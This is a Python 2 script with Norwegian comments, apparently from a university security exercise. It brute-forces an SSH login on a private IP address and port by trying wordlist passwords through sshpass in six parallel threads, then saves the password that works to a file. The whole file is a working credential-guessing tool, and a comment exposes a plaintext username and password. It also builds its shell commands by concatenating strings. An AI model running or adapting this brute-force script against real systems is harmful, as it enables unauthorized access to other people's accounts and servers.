# coding=utf-8
# 32-126 : 20-7E
# Tråder: https://docs.python.org/2/library/threading.html
# Queue: https://www.troyfawkes.com/learn-python-multithreading-queues-basics/
import threading
import commands

p = 1
USERNAME = "sigurdkb"
IP_ADRESS = "10.225.147.156"
PORT = "2222"
new_results = []
correct_pw = ""
# sshpass -p bkdrugis ssh Sigurdkb@10.225.147.156 -p 2222

def connect_ssh(pw_list):
        global correct_pw

        for n in pw_list:
            # Lagrer resultatene fra kommando i variabel
            result = commands.getoutput("sshpass -p " + n + " ssh "+ USERNAME + "@" + IP_ADRESS + " -p " + PORT)

            # Dersom result inneholder permission denied prøver tråden neste passord
            if result.__contains__("Permission denied"):
                print "Password try: " + n
            elif result.__contains__("Welcome to Ubuntu"): # Fra IS-105 UH-IAAS (samme velkomst (også Ubuntu-server))
                print "Correct password: " + n
                correct_pw = n
                f = open("correct_pw.txt", 'w')
                f.write(correct_pw)
                exit(0)

            else:
            # Dersom result ikke ennholder permission denied legger den passordet i en liste sammen med andre passord som ligger der av samme grunn
                print "Passord som gav nytt resultat: " + n
                print " Output: " + result
                new_results.append(n)
                print new_results


# Funksjon for å fordele passordene i noenlunde like lister (sekvensielt)
# Legg til nye lister og nye if-setninger for å fordele passordene på flere lister (dersom flere tråder ønskes)
def get_pw():
    pw_list1 = []
    pw_list2 = []
    pw_list3 = []
    pw_list4 = []
    pw_list5 = []
    pw_list6 = []

    global p
    pw_list = read_lines()
    for n in pw_list:
            if p == 1:
                pw_list1.append(n.strip('\n'))
                p += 1
            elif p == 2:
                pw_list2.append(n.strip('\n'))
                p += 1
            elif p == 3:
                pw_list3.append(n.strip('\n'))
                p += 1
            elif p == 4:
                pw_list4.append(n.strip('\n'))
                p += 1
            elif p == 5:
                pw_list5.append(n.strip('\n'))
                p += 1
            elif p == 6:
                pw_list6.append(n.strip('\n'))
                p = 1
    # Husk å returnere de nye listene...
    return (pw_list1, pw_list2, pw_list3, pw_list4, pw_list5, pw_list6)


# Leser fil og legger hver linje som et nytt element i lista (som blir delt opp i metoden over.)
def read_lines():
    file = open("wordlist.txt", 'r')
    lines = file.readlines()
    return lines


# Henter lister og starter tråder
def main():
    list1, list2, list3, list4, list5, list6 = get_pw()

    # Trådene kjører samme metode, men med hver sin liste. Alle kombinasjoner (5 chars totalt (lower case alfabet)) blir testet.
    t1 = threading.Thread(target=connect_ssh, args=(list1,))
    t2 = threading.Thread(target=connect_ssh, args=(list2,))
    t3 = threading.Thread(target=connect_ssh, args=(list3,))
    t4 = threading.Thread(target=connect_ssh, args=(list4,))
    t5 = threading.Thread(target=connect_ssh, args=(list5,))
    t6 = threading.Thread(target=connect_ssh, args=(list6,))

    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()

    t1.join()
    t2.join()
    t3.join()
    t4.join()
    t5.join()
    t6.join()

# Starter main-funksjon
main()



